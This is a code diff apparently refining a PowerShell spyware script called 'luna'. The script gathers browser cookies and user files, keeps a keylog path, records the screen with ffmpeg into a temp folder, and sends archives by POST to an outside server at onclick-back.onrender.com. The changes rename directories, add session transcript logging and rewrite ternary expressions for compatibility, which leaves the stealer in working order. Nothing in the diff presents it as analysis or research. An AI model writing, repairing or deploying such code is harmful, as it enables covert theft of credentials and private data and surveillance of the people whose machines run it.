@@ -2,21 +2,17 @@
 
 $serverUrl = "https://onclick-back.onrender.com"
 $tempDir = "$env:TEMP\luna"
-    if (!(Test-Path $tempDir)) {
-        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-        (Get-Item $tempDir).Attributes = 'Hidden'
-    }
-    New-Item -ItemType Directory -Path $cookieDir, $fileDumpDir -Force | Out-Null
 $cookieDir = "$tempDir\cookies"
 $fileDumpDir = "$tempDir\files"
+$videoSubDir = "$tempDir\video"
 $logPath = "$tempDir\log.json"
 $keylogPath = "$tempDir\keylog.txt"
-$videoDir = "$env:USERPROFILE"
+$recordingDir = "$env:USERPROFILE\luna_video_fragments"
 
 New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir | Out-Null
-if (Test-Path $tempDir) {
-    (Get-Item $tempDir).Attributes += 'Hidden'
-}
+
+
+Start-Transcript -Path "$tempDir\session.log" -Append
 
 function Collect-Cookies {
     $targets = @(
@@ -71,7 +67,7 @@ function Collect-Files {
 
 function Start-Recording {
     $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
-    $videoDir = "$env:USERPROFILE\luna_video_fragments"
+    $recordingDir = "$env:USERPROFILE\luna_video_fragments"
 
     if (!(Test-Path $ffmpeg)) {
         Write-Warning "ffmpeg not found at $ffmpeg"
@@ -171,7 +167,7 @@ function Archive-And-Report {
         }
 
         if ($pathsToArchive.Count -eq 0) {
-            Write-Warning "Nothing to archive — skipping archive/report"
+            Write-Warning "Nothing to archive - skipping archive/report"
             return
         }
 
@@ -186,8 +182,16 @@ function Archive-And-Report {
             Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
         }
 
-        $filesCount = (Test-Path $fileDumpDir) ? (Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count : 0
-        $cookiesCount = (Test-Path $cookieDir) ? (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count : 0
+        if (Test-Path $fileDumpDir) {
+            $filesCount = (Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count
+        } else {
+            $filesCount = 0
+        }
+        if (Test-Path $cookieDir) {
+            $cookiesCount = (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count
+        } else {
+            $cookiesCount = 0
+        }
 
         $summary = @"
 PowerShell Identity Report
